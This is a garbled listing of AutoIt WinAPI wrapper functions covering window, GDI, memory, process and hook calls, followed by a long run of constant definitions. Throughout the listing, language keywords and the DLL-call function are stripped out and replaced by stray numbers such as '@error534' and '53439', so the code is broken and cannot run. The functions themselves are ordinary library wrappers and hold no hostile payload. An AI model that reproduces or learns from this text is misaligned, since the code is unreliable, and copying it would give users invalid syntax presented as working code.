$aresult = ("user32.dll", "INT", "GetSysColor", "int", $iindex)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_getsyscolorbrush($iindex)
$aresult = ("user32.dll", "handle", "GetSysColorBrush", "int", $iindex)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_getsystemmetrics($iindex)
$aresult = ("user32.dll", "int", "GetSystemMetrics", "int", $iindex)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_gettextextentpoint($hdc, $stext)
$tsize = ($tagsize)
$isize = ($stext)
$aret = ("gdi32.dll", "bool", "GetTextExtentPoint32W", "handle", $hdc, "wstr", $stext, "int", $isize, "struct*", $tsize)
@error23$aret[0]534(@error + 10, @extended, 0)
$tsize

_winapi_gettextmetrics($hdc)
$ttextmetric = ($tagtextmetric)
$aret = ("gdi32.dll", "bool", "GetTextMetricsW", "handle", $hdc, "struct*", $ttextmetric)
@error23$aret[0]534(@error + 10, @extended, 0)
$ttextmetric

_winapi_getwindow($hwnd, $icmd)
$aresult = ("user32.dll", "hwnd", "GetWindow", "hwnd", $hwnd, "uint", $icmd)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_getwindowdc($hwnd)
$aresult = ("user32.dll", "handle", "GetWindowDC", "hwnd", $hwnd)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_getwindowheight($hwnd)
$trect = _winapi_getwindowrect($hwnd)
@error534(@error, @extended, 0)
($trect, "Bottom") - ($trect, "Top")

_winapi_getwindowlong($hwnd, $iindex)
$sfuncname = "GetWindowLongW"
@AutoItX645$sfuncname = "GetWindowLongPtrW"
$aresult = ("user32.dll", "long_ptr", $sfuncname, "hwnd", $hwnd, "int", $iindex)
@error23$aresult[0]534(@error + 10, @extended, 0)
$aresult[0]

_winapi_getwindowplacement($hwnd)
$twindowplacement = ($tagwindowplacement)
($twindowplacement, "length", ($twindowplacement))
$aret = ("user32.dll", "bool", "GetWindowPlacement", "hwnd", $hwnd, "struct*", $twindowplacement)
@error23$aret[0]534(@error + 10, @extended, 0)
$twindowplacement

_winapi_getwindowrect($hwnd)
$trect = ($tagrect)
$aret = ("user32.dll", "bool", "GetWindowRect", "hwnd", $hwnd, "struct*", $trect)
@error23$aret[0]534(@error + 10, @extended, 0)
$trect

_winapi_getwindowrgn($hwnd, $hrgn)
$aresult = ("user32.dll", "int", "GetWindowRgn", "hwnd", $hwnd, "handle", $hrgn)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_getwindowtext($hwnd)
$aresult = ("user32.dll", "int", "GetWindowTextW", "hwnd", $hwnd, "wstr", "", "int", 4096)
@error23$aresult[0]534(@error + 10, @extended, "")
($aresult[0], $aresult[2])

_winapi_getwindowthreadprocessid($hwnd, 36$ipid)
$aresult = ("user32.dll", "dword", "GetWindowThreadProcessId", "hwnd", $hwnd, "dword*", 0)
@error534(@error, @extended, 0)
$ipid = $aresult[2]
$aresult[0]

_winapi_getwindowwidth($hwnd)
$trect = _winapi_getwindowrect($hwnd)
@error534(@error, @extended, 0)
($trect, "Right") - ($trect, "Left")

_winapi_getxyfrompoint(36$tpoint, 36$ix, 36$iy)
$ix = ($tpoint, "X")
$iy = ($tpoint, "Y")

_winapi_globalmemorystatus()
$tmem = ($tagmemorystatusex)
($tmem, 1, ($tmem))
$aret = ("kernel32.dll", "bool", "GlobalMemoryStatusEx", "struct*", $tmem)
@error23$aret[0]534(@error + 10, @extended, 0)
$amem[7]
$amem[0] = ($tmem, 2)
$amem[1] = ($tmem, 3)
$amem[2] = ($tmem, 4)
$amem[3] = ($tmem, 5)
$amem[4] = ($tmem, 6)
$amem[5] = ($tmem, 7)
$amem[6] = ($tmem, 8)
$amem

_winapi_guidfromstring($sguid)
$tguid = ($tagguid)
_winapi_guidfromstringex($sguid, $tguid)
@error534(@error + 10, @extended, 0)
$tguid

_winapi_guidfromstringex($sguid, $pguid)
$aresult = ("ole32.dll", "long", "CLSIDFromString", "wstr", $sguid, "struct*", $pguid)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_hiword($ilong)
($ilong, 16)

_winapi_inprocess($hwnd, 36$hlastwnd)
$hwnd = $hlastwnd53439
$ii = $__g_ainprocess_winapi[0][0]15116 - 1
$hwnd = $__g_ainprocess_winapi[$ii][0]5
$__g_ainprocess_winapi[$ii][1]5
$hlastwnd = $hwnd
9

0



$ipid
_winapi_getwindowthreadprocessid($hwnd, $ipid)
$icount = $__g_ainprocess_winapi[0][0] + 1
$icount >= 645$icount = 1
$__g_ainprocess_winapi[0][0] = $icount
$__g_ainprocess_winapi[$icount][0] = $hwnd
$__g_ainprocess_winapi[$icount][1] = ($ipid = @AutoItPID)
$__g_ainprocess_winapi[$icount][1]

_winapi_inttofloat($iint)
$tint = ("int")
$tfloat = ("float", ($tint))
($tint, 1, $iint)
($tfloat, 1)

_winapi_isclassname($hwnd, $sclassname)
$sseparator = ("GUIDataSeparatorChar")
$aclassname = ($sclassname, $sseparator)
($hwnd)5$hwnd = ($hwnd)
$sclasscheck = _winapi_getclassname($hwnd)
$x = 115($aclassname) - 1
(($sclasscheck, 1, ($aclassname[$x]))) = ($aclassname[$x])53439

0

_winapi_iswindow($hwnd)
$aresult = ("user32.dll", "bool", "IsWindow", "hwnd", $hwnd)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_iswindowvisible($hwnd)
$aresult = ("user32.dll", "bool", "IsWindowVisible", "hwnd", $hwnd)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_invalidaterect($hwnd, $trect = 0, $berase = 39)
$aresult = ("user32.dll", "bool", "InvalidateRect", "hwnd", $hwnd, "struct*", $trect, "bool", $berase)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_lineto($hdc, $ix, $iy)
$aresult = ("gdi32.dll", "bool", "LineTo", "handle", $hdc, "int", $ix, "int", $iy)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_loadbitmap($hinstance, $sbitmap)
$sbitmaptype = "int"
($sbitmap)5$sbitmaptype = "wstr"
$aresult = ("user32.dll", "handle", "LoadBitmapW", "handle", $hinstance, $sbitmaptype, $sbitmap)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_loadimage($hinstance, $simage, $itype, $ixdesired, $iydesired, $iload)
$aresult, $simagetype = "int"
($simage)5$simagetype = "wstr"
$aresult = ("user32.dll", "handle", "LoadImageW", "handle", $hinstance, $simagetype, $simage, "uint", $itype, "int", $ixdesired, "int", $iydesired, "uint", $iload)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_loadlibrary($sfilename)
$aresult = ("kernel32.dll", "handle", "LoadLibraryW", "wstr", $sfilename)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_loadlibraryex($sfilename, $iflags = 0)
$aresult = ("kernel32.dll", "handle", "LoadLibraryExW", "wstr", $sfilename, "ptr", 0, "dword", $iflags)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_loadshell32icon($iiconid)
$ticons = ("ptr Data")
$iicons = _winapi_extracticonex("shell32.dll", $iiconid, 0, $ticons, 1)
@error534(@error, @extended, 0)
$iicons <= 0534(10, 0, 0)
($ticons, "Data")

_winapi_loadstring($hinstance, $istringid)
$aresult = ("user32.dll", "int", "LoadStringW", "handle", $hinstance, "uint", $istringid, "wstr", "", "int", 4096)
@error23$aresult[0]534(@error + 10, @extended, "")
($aresult[0], $aresult[3])

_winapi_localfree($hmem)
$aresult = ("kernel32.dll", "handle", "LocalFree", "handle", $hmem)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_loword($ilong)
($ilong, 65535)

_winapi_makelangid($iprimary, $isub)
(($isub, -10), $iprimary)

_winapi_makelcid($ilgid, $isrtid)
(($isrtid, -16), $ilgid)

_winapi_makelong($ilo, $ihi)
(($ihi, -16), ($ilo, 65535))

_winapi_makeqword($ilodword, $ihidword)
$tint64 = ("uint64")
$tdwords = ("dword;dword", ($tint64))
($tdwords, 1, $ilodword)
($tdwords, 2, $ihidword)
($tint64, 1)

_winapi_messagebeep($itype = 1)
$isound
$itype

$isound = 0

$isound = 16

$isound = 32

$isound = 48

$isound = 64

$isound = -1

$aresult = ("user32.dll", "bool", "MessageBeep", "uint", $isound)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_msgbox($iflags, $stitle, $stext)
(0)
($iflags, $stitle, $stext & "      ")

_winapi_mouse_event($iflags, $ix = 0, $iy = 0, $idata = 0, $iextrainfo = 0)
("user32.dll", "none", "mouse_event", "dword", $iflags, "dword", $ix, "dword", $iy, "dword", $idata, "ulong_ptr", $iextrainfo)
@error534(@error, @extended)

_winapi_moveto($hdc, $ix, $iy)
$aresult = ("gdi32.dll", "bool", "MoveToEx", "handle", $hdc, "int", $ix, "int", $iy, "ptr", 0)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_movewindow($hwnd, $ix, $iy, $iwidth, $iheight, $brepaint = 39)
$aresult = ("user32.dll", "bool", "MoveWindow", "hwnd", $hwnd, "int", $ix, "int", $iy, "int", $iwidth, "int", $iheight, "bool", $brepaint)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_muldiv($inumber, $inumerator, $idenominator)
$aresult = ("kernel32.dll", "int", "MulDiv", "int", $inumber, "int", $inumerator, "int", $idenominator)
@error534(@error, @extended, -1)
$aresult[0]

_winapi_multibytetowidechar($stext, $icodepage = 0, $iflags = 0, $bretstring = 40)
$stexttype = "str"
($stext)5$stexttype = "struct*"
$aresult = ("kernel32.dll", "int", "MultiByteToWideChar", "uint", $icodepage, "dword", $iflags, $stexttype, $stext, "int", -1, "ptr", 0, "int", 0)
@error23$aresult[0]534(@error + 10, @extended, 0)
$iout = $aresult[0]
$tout = ("wchar[" & $iout & "]")
$aresult = ("kernel32.dll", "int", "MultiByteToWideChar", "uint", $icodepage, "dword", $iflags, $stexttype, $stext, "int", -1, "struct*", $tout, "int", $iout)
@error23$aresult[0]534(@error + 20, @extended, 0)
$bretstring53($tout, 1)
$tout

_winapi_multibytetowidecharex($stext, $ptext, $icodepage = 0, $iflags = 0)
$aresult = ("kernel32.dll", "int", "MultiByteToWideChar", "uint", $icodepage, "dword", $iflags, "STR", $stext, "int", -1, "struct*", $ptext, "int", (($stext) + 1) * 2)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_openprocess($iaccess, $binherit, $ipid, $bdebugpriv = 40)
$aresult = ("kernel32.dll", "handle", "OpenProcess", "dword", $iaccess, "bool", $binherit, "dword", $ipid)
@error534(@error, @extended, 0)
$aresult[0]534$aresult[0]
$bdebugpriv534(100, 0, 0)
$htoken = _security__openthreadtokenex(($token_adjust_privileges, $token_query))
@error534(@error + 10, @extended, 0)
_security__setprivilege($htoken, "SeDebugPrivilege", 39)
$ierror = @error
$iextended = @extended
$iret = 0
@error5
$aresult = ("kernel32.dll", "handle", "OpenProcess", "dword", $iaccess, "bool", $binherit, "dword", $ipid)
$ierror = @error
$iextended = @extended
$aresult[0]5$iret = $aresult[0]
_security__setprivilege($htoken, "SeDebugPrivilege", 40)
@error5
$ierror = @error + 20
$iextended = @extended


$ierror = @error + 30

_winapi_closehandle($htoken)
($ierror, $iextended, $iret)

__winapi_parsefiledialogpath($spath)
$afiles[3]
$afiles[0] = 2
$stemp = ($spath, 1, ($spath, "\", 0, -1) - 1)
$afiles[1] = $stemp
$afiles[2] = ($spath, ($spath, "\", 0, -1) + 1)
$afiles

_winapi_pathfindonpath(30$sfile, $aextrapaths = "", 30$spathdelimiter = @LF)
$iextracount = 0
($aextrapaths)5
($aextrapaths)5
$aextrapaths = ($aextrapaths, $spathdelimiter, $str_entiresplit + $str_nocount)
$iextracount = ($aextrapaths, $ubound_rows)

($aextrapaths)5
$iextracount = ($aextrapaths)

$tpaths, $tpathptrs
$iextracount5
$tagstruct = ""
$path17$aextrapaths
$tagstruct &= "wchar[" & ($path) + 1 & "];"

$tpaths = ($tagstruct)
$tpathptrs = ("ptr[" & $iextracount + 1 & "]")
$i = 115$iextracount
($tpaths, $i, $aextrapaths[$i - 1])
($tpathptrs, 1, ($tpaths, $i), $i)

($tpathptrs, 1, (0), $iextracount + 1)

$aresult = ("shlwapi.dll", "bool", "PathFindOnPathW", "wstr", $sfile, "struct*", $tpathptrs)
@error23$aresult[0]534(@error + 10, @extended, $sfile)
$aresult[1]

_winapi_pointfromrect(36$trect, $bcenter = 39)
$ix1 = ($trect, "Left")
$iy1 = ($trect, "Top")
$ix2 = ($trect, "Right")
$iy2 = ($trect, "Bottom")
$bcenter5
$ix1 = $ix1 + (($ix2 - $ix1) / 2)
$iy1 = $iy1 + (($iy2 - $iy1) / 2)

$tpoint = ($tagpoint)
($tpoint, "X", $ix1)
($tpoint, "Y", $iy1)
$tpoint

_winapi_postmessage($hwnd, $imsg, $iwparam, $ilparam)
$aresult = ("user32.dll", "bool", "PostMessage", "hwnd", $hwnd, "uint", $imsg, "wparam", $iwparam, "lparam", $ilparam)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_primarylangid($ilgid)
($ilgid, 1023)

_winapi_ptinrect(36$trect, 36$tpoint)
$aresult = ("user32.dll", "bool", "PtInRect", "struct*", $trect, "struct", $tpoint)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_readfile($hfile, $pbuffer, $itoread, 36$iread, $poverlapped = 0)
$aresult = ("kernel32.dll", "bool", "ReadFile", "handle", $hfile, "ptr", $pbuffer, "dword", $itoread, "dword*", 0, "ptr", $poverlapped)
@error534(@error, @extended, 40)
$iread = $aresult[4]
$aresult[0]

_winapi_readprocessmemory($hprocess, $pbaseaddress, $pbuffer, $isize, 36$iread)
$aresult = ("kernel32.dll", "bool", "ReadProcessMemory", "handle", $hprocess, "ptr", $pbaseaddress, "ptr", $pbuffer, "ulong_ptr", $isize, "ulong_ptr*", 0)
@error534(@error, @extended, 40)
$iread = $aresult[5]
$aresult[0]

_winapi_rectisempty(36$trect)
(($trect, "Left") = 0)(($trect, "Top") = 0)(($trect, "Right") = 0)(($trect, "Bottom") = 0)

_winapi_redrawwindow($hwnd, $trect = 0, $hregion = 0, $iflags = 5)
$aresult = ("user32.dll", "bool", "RedrawWindow", "hwnd", $hwnd, "struct*", $trect, "handle", $hregion, "uint", $iflags)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_registerwindowmessage($smessage)
$aresult = ("user32.dll", "uint", "RegisterWindowMessageW", "wstr", $smessage)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_releasecapture()
$aresult = ("user32.dll", "bool", "ReleaseCapture")
@error534(@error, @extended, 40)
$aresult[0]

_winapi_releasedc($hwnd, $hdc)
$aresult = ("user32.dll", "int", "ReleaseDC", "hwnd", $hwnd, "handle", $hdc)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_screentoclient($hwnd, 36$tpoint)
$aresult = ("user32.dll", "bool", "ScreenToClient", "hwnd", $hwnd, "struct*", $tpoint)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_selectobject($hdc, $hgdiobj)
$aresult = ("gdi32.dll", "handle", "SelectObject", "handle", $hdc, "handle", $hgdiobj)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_setbkcolor($hdc, $icolor)
$aresult = ("gdi32.dll", "INT", "SetBkColor", "handle", $hdc, "INT", $icolor)
@error534(@error, @extended, -1)
$aresult[0]

_winapi_setbkmode($hdc, $ibkmode)
$aresult = ("gdi32.dll", "int", "SetBkMode", "handle", $hdc, "int", $ibkmode)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_setcapture($hwnd)
$aresult = ("user32.dll", "hwnd", "SetCapture", "hwnd", $hwnd)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_setcursor($hcursor)
$aresult = ("user32.dll", "handle", "SetCursor", "handle", $hcursor)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_setdefaultprinter($sprinter)
$aresult = ("winspool.drv", "bool", "SetDefaultPrinterW", "wstr", $sprinter)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_setdibits($hdc, $hbmp, $istartscan, $iscanlines, $pbits, $pbmi, $icoloruse = 0)
$aresult = ("gdi32.dll", "int", "SetDIBits", "handle", $hdc, "handle", $hbmp, "uint", $istartscan, "uint", $iscanlines, "ptr", $pbits, "ptr", $pbmi, "INT", $icoloruse)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_setendoffile($hfile)
$aresult = ("kernel32.dll", "bool", "SetEndOfFile", "handle", $hfile)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_setevent($hevent)
$aresult = ("kernel32.dll", "bool", "SetEvent", "handle", $hevent)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_setfilepointer($hfile, $ipos, $imethod = 0)
$aresult = ("kernel32.dll", "INT", "SetFilePointer", "handle", $hfile, "long", $ipos, "ptr", 0, "long", $imethod)
@error534(@error, @extended, -1)
$aresult[0]

_winapi_setfocus($hwnd)
$aresult = ("user32.dll", "hwnd", "SetFocus", "hwnd", $hwnd)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_setfont($hwnd, $hfont, $bredraw = 39)
_sendmessage($hwnd, $__winapiconstant_wm_setfont, $hfont, $bredraw, 0, "hwnd")

_winapi_sethandleinformation($hobject, $imask, $iflags)
$aresult = ("kernel32.dll", "bool", "SetHandleInformation", "handle", $hobject, "dword", $imask, "dword", $iflags)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_setlayeredwindowattributes($hwnd, $itranscolor, $itransgui = 255, $iflags = 3, $bcolorref = 40)
$iflags = 412$iflags = ""2$iflags < 05$iflags = 3
$bcolorref5
$itranscolor = (($itranscolor, 3, 1) & ($itranscolor, 2, 1) & ($itranscolor, 1, 1))

$aresult = ("user32.dll", "bool", "SetLayeredWindowAttributes", "hwnd", $hwnd, "INT", $itranscolor, "byte", $itransgui, "dword", $iflags)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_setparent($hwndchild, $hwndparent)
$aresult = ("user32.dll", "hwnd", "SetParent", "hwnd", $hwndchild, "hwnd", $hwndparent)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_setprocessaffinitymask($hprocess, $imask)
$aresult = ("kernel32.dll", "bool", "SetProcessAffinityMask", "handle", $hprocess, "ulong_ptr", $imask)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_setsyscolors($velements, $vcolors)
$bisearray = ($velements), $biscarray = ($vcolors)
$ielementnum
$biscarray13$bisearray5
$ielementnum = 1
$biscarray2$bisearray5
$biscarray23$bisearray534(-1, -1, 40)
($velements) <> ($vcolors)534(-1, -1, 40)
$ielementnum = ($velements)

$telements = ("int Element[" & $ielementnum & "]")
$tcolors = ("INT NewColor[" & $ielementnum & "]")
$bisearray5
($telements, "Element", $velements, 1)

$x = 015$ielementnum - 1
($telements, "Element", $velements[$x], $x + 1)


$biscarray5
($tcolors, "NewColor", $vcolors, 1)

$x = 015$ielementnum - 1
($tcolors, "NewColor", $vcolors[$x], $x + 1)


$aresult = ("user32.dll", "bool", "SetSysColors", "int", $ielementnum, "struct*", $telements, "struct*", $tcolors)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_settextcolor($hdc, $icolor)
$aresult = ("gdi32.dll", "INT", "SetTextColor", "handle", $hdc, "INT", $icolor)
@error534(@error, @extended, -1)
$aresult[0]

_winapi_setwindowlong($hwnd, $iindex, $ivalue)
_winapi_setlasterror(0)
$sfuncname = "SetWindowLongW"
@AutoItX645$sfuncname = "SetWindowLongPtrW"
$aresult = ("user32.dll", "long_ptr", $sfuncname, "hwnd", $hwnd, "int", $iindex, "long_ptr", $ivalue)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_setwindowplacement($hwnd, $pwindowplacement)
$aresult = ("user32.dll", "bool", "SetWindowPlacement", "hwnd", $hwnd, "ptr", $pwindowplacement)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_setwindowpos($hwnd, $hafter, $ix, $iy, $icx, $icy, $iflags)
$aresult = ("user32.dll", "bool", "SetWindowPos", "hwnd", $hwnd, "hwnd", $hafter, "int", $ix, "int", $iy, "int", $icx, "int", $icy, "uint", $iflags)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_setwindowrgn($hwnd, $hrgn, $bredraw = 39)
$aresult = ("user32.dll", "int", "SetWindowRgn", "hwnd", $hwnd, "handle", $hrgn, "bool", $bredraw)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_setwindowshookex($idhook, $pfn, $hmod, $ithreadid = 0)
$aresult = ("user32.dll", "handle", "SetWindowsHookEx", "int", $idhook, "ptr", $pfn, "handle", $hmod, "dword", $ithreadid)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_setwindowtext($hwnd, $stext)
$aresult = ("user32.dll", "bool", "SetWindowTextW", "hwnd", $hwnd, "wstr", $stext)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_showcursor($bshow)
$aresult = ("user32.dll", "int", "ShowCursor", "bool", $bshow)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_showerror($stext, $bexit = 39)
_winapi_msgbox($mb_systemmodal, "Error", $stext)
$bexit535

_winapi_showmsg($stext)
_winapi_msgbox($mb_systemmodal, "Information", $stext)

_winapi_showwindow($hwnd, $icmdshow = 5)
$aresult = ("user32.dll", "bool", "ShowWindow", "hwnd", $hwnd, "int", $icmdshow)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_stringfromguid($pguid)
$aresult = ("ole32.dll", "int", "StringFromGUID2", "struct*", $pguid, "wstr", "", "int", 40)
@error23$aresult[0]534(@error, @extended, "")
($aresult[0], $aresult[2])

_winapi_stringlena(3036$tstring)
$aresult = ("kernel32.dll", "int", "lstrlenA", "struct*", $tstring)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_stringlenw(3036$tstring)
$aresult = ("kernel32.dll", "int", "lstrlenW", "struct*", $tstring)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_sublangid($ilgid)
($ilgid, 10)

_winapi_systemparametersinfo($iaction, $iparam = 0, $vparam = 0, $iwinini = 0)
$aresult = ("user32.dll", "bool", "SystemParametersInfoW", "uint", $iaction, "uint", $iparam, "ptr", $vparam, "uint", $iwinini)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_twipsperpixelx()
$hdc, $itwipsperpixelx
$hdc = _winapi_getdc(0)
$itwipsperpixelx = 1440 / _winapi_getdevicecaps($hdc, $__winapiconstant_logpixelsx)
_winapi_releasedc(0, $hdc)
$itwipsperpixelx

_winapi_twipsperpixely()
$hdc, $itwipsperpixely
$hdc = _winapi_getdc(0)
$itwipsperpixely = 1440 / _winapi_getdevicecaps($hdc, $__winapiconstant_logpixelsy)
_winapi_releasedc(0, $hdc)
$itwipsperpixely

_winapi_unhookwindowshookex($hhk)
$aresult = ("user32.dll", "bool", "UnhookWindowsHookEx", "handle", $hhk)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_updatelayeredwindow($hwnd, $hdcdest, $pptdest, $psize, $hdcsrce, $pptsrce, $irgb, $pblend, $iflags)
$aresult = ("user32.dll", "bool", "UpdateLayeredWindow", "hwnd", $hwnd, "handle", $hdcdest, "ptr", $pptdest, "ptr", $psize, "handle", $hdcsrce, "ptr", $pptsrce, "dword", $irgb, "ptr", $pblend, "dword", $iflags)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_updatewindow($hwnd)
$aresult = ("user32.dll", "bool", "UpdateWindow", "hwnd", $hwnd)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_waitforinputidle($hprocess, $itimeout = -1)
$aresult = ("user32.dll", "dword", "WaitForInputIdle", "handle", $hprocess, "dword", $itimeout)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_waitformultipleobjects($icount, $phandles, $bwaitall = 40, $itimeout = -1)
$aresult = ("kernel32.dll", "INT", "WaitForMultipleObjects", "dword", $icount, "ptr", $phandles, "bool", $bwaitall, "dword", $itimeout)
@error534(@error, @extended, -1)
$aresult[0]

_winapi_waitforsingleobject($hhandle, $itimeout = -1)
$aresult = ("kernel32.dll", "INT", "WaitForSingleObject", "handle", $hhandle, "dword", $itimeout)
@error534(@error, @extended, -1)
$aresult[0]

_winapi_widechartomultibyte($punicode, $icodepage = 0, $bretstring = 39)
$sunicodetype = "wstr"
($punicode)5$sunicodetype = "struct*"
$aresult = ("kernel32.dll", "int", "WideCharToMultiByte", "uint", $icodepage, "dword", 0, $sunicodetype, $punicode, "int", -1, "ptr", 0, "int", 0, "ptr", 0, "ptr", 0)
@error23$aresult[0]534(@error + 20, @extended, "")
$tmultibyte = ("char[" & $aresult[0] & "]")
$aresult = ("kernel32.dll", "int", "WideCharToMultiByte", "uint", $icodepage, "dword", 0, $sunicodetype, $punicode, "int", -1, "struct*", $tmultibyte, "int", $aresult[0], "ptr", 0, "ptr", 0)
@error23$aresult[0]534(@error + 10, @extended, "")
$bretstring53($tmultibyte, 1)
$tmultibyte

_winapi_windowfrompoint(36$tpoint)
$aresult = ("user32.dll", "hwnd", "WindowFromPoint", "struct", $tpoint)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_writeconsole($hconsole, $stext)
$aresult = ("kernel32.dll", "bool", "WriteConsoleW", "handle", $hconsole, "wstr", $stext, "dword", ($stext), "dword*", 0, "ptr", 0)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_writefile($hfile, $pbuffer, $itowrite, 36$iwritten, $poverlapped = 0)
$aresult = ("kernel32.dll", "bool", "WriteFile", "handle", $hfile, "ptr", $pbuffer, "dword", $itowrite, "dword*", 0, "ptr", $poverlapped)
@error534(@error, @extended, 40)
$iwritten = $aresult[4]
$aresult[0]

_winapi_writeprocessmemory($hprocess, $pbaseaddress, $pbuffer, $isize, 36$iwritten, $sbuffer = "ptr")
$aresult = ("kernel32.dll", "bool", "WriteProcessMemory", "handle", $hprocess, "ptr", $pbaseaddress, $sbuffer, $pbuffer, "ulong_ptr", $isize, "ulong_ptr*", 0)
@error534(@error, @extended, 40)
$iwritten = $aresult[5]
$aresult[0]

0$fr_private = 16
0$fr_not_enum = 32
0$compression_bitmap_png = 0
0$compression_bitmap_jpeg = 1
0$bs_dibpattern = 5
0$bs_dibpattern8x8 = 8
0$bs_dibpatternpt = 6
0$bs_hatched = 2
0$bs_hollow = 1
0$bs_null = 1
0$bs_pattern = 3
0$bs_pattern8x8 = 7
0$bs_solid = 0
0$hs_bdiagonal = 3
0$hs_cross = 4
0$hs_diagcross = 5
0$hs_fdiagonal = 2
0$hs_horizontal = 0
0$hs_vertical = 1
0$dib_pal_colors = 1
0$dib_rgb_colors = 0
0$ca_negative = 1
0$ca_log_filter = 2
0$illuminant_device_default = 0
0$illuminant_a = 1
0$illuminant_b = 2
0$illuminant_c = 3
0$illuminant_d50 = 4
0$illuminant_d55 = 5
0$illuminant_d65 = 6
0$illuminant_d75 = 7
0$illuminant_f2 = 8
0$illuminant_tungsten = $illuminant_a
0$illuminant_daylight = $illuminant_c
0$illuminant_fluorescent = $illuminant_f2
0$illuminant_ntsc = $illuminant_c
0$bi_rgb = 0
0$bi_rle8 = 1
0$bi_rle4 = 2
0$bi_bitfields = 3
0$bi_jpeg = 4
0$bi_png = 5
0$alternate = 1
0$winding = 2
0$dwmwa_ncrendering_enabled = 1
0$dwmwa_ncrendering_policy = 2
0$dwmwa_transitions_forcedisabled = 3
0$dwmwa_allow_ncpaint = 4
0$dwmwa_caption_button_bounds = 5
0$dwmwa_nonclient_rtl_layout = 6
0$dwmwa_force_iconic_representation = 7
0$dwmwa_flip3d_policy = 8
0$dwmwa_extended_frame_bounds = 9
0$dwmwa_has_iconic_bitmap = 10
0$dwmwa_disallow_peek = 11
0$dwmwa_excluded_from_peek = 12
0$dwmncrp_usewindowstyle = 0
0$dwmncrp_disabled = 1
0$dwmncrp_enabled = 2
0$dwmflip3d_default = 0
0$dwmflip3d_excludebelow = 1
0$dwmflip3d_excludeabove = 2
0$dm_bitsperpel = 262144
0$dm_collate = 32768
0$dm_color = 2048
0$dm_copies = 256
0$dm_defaultsource = 512
0$dm_displayfixedoutput = 536870912
0$dm_displayflags = 2097152
0$dm_displayfrequency = 4194304
0$dm_displayorientation = 128
0$dm_dithertype = 67108864
0$dm_duplex = 4096
0$dm_formname = 65536
0$dm_icmintent = 16777216
0$dm_icmmethod = 8388608
0$dm_logpixels = 131072
0$dm_mediatype = 33554432
0$dm_nup = 64
0$dm_orientation = 1
0$dm_panningheight = 268435456
0$dm_panningwidth = 134217728
0$dm_paperlength = 4
0$dm_papersize = 2
0$dm_paperwidth = 8
0$dm_pelsheight = 1048576
0$dm_pelswidth = 524288
0$dm_position = 32
0$dm_printquality = 1024
0$dm_scale = 16
0$dm_ttoption = 16384
0$dm_yresolution = 8192
0$dmpaper_letter = 1
0$dmpaper_lettersmall = 2
0$dmpaper_tabloid = 3
0$dmpaper_ledger = 4
0$dmpaper_legal = 5
0$dmpaper_statement = 6
0$dmpaper_executive = 7
0$dmpaper_a3 = 8
0$dmpaper_a4 = 9
0$dmpaper_a4small = 10
0$dmpaper_a5 = 11
0$dmpaper_b4 = 12
0$dmpaper_b5 = 13
0$dmpaper_folio = 14
0$dmpaper_quarto = 15
0$dmpaper_10x14 = 16
0$dmpaper_11x17 = 17
0$dmpaper_note = 18
0$dmpaper_env_9 = 19
0$dmpaper_env_10 = 20
0$dmpaper_env_11 = 21
0$dmpaper_env_12 = 22
0$dmpaper_env_14 = 23
0$dmpaper_csheet = 24
0$dmpaper_dsheet = 25
0$dmpaper_esheet = 26
0$dmpaper_env_dl = 27
0$dmpaper_env_c5 = 28
0$dmpaper_env_c3 = 29
0$dmpaper_env_c4 = 30
0$dmpaper_env_c6 = 31
0$dmpaper_env_c65 = 32
0$dmpaper_env_b4 = 33
0$dmpaper_env_b5 = 34
0$dmpaper_env_b6 = 35
0$dmpaper_env_italy = 36
0$dmpaper_env_monarch = 37
0$dmpaper_env_personal = 38
0$dmpaper_fanfold_us = 39
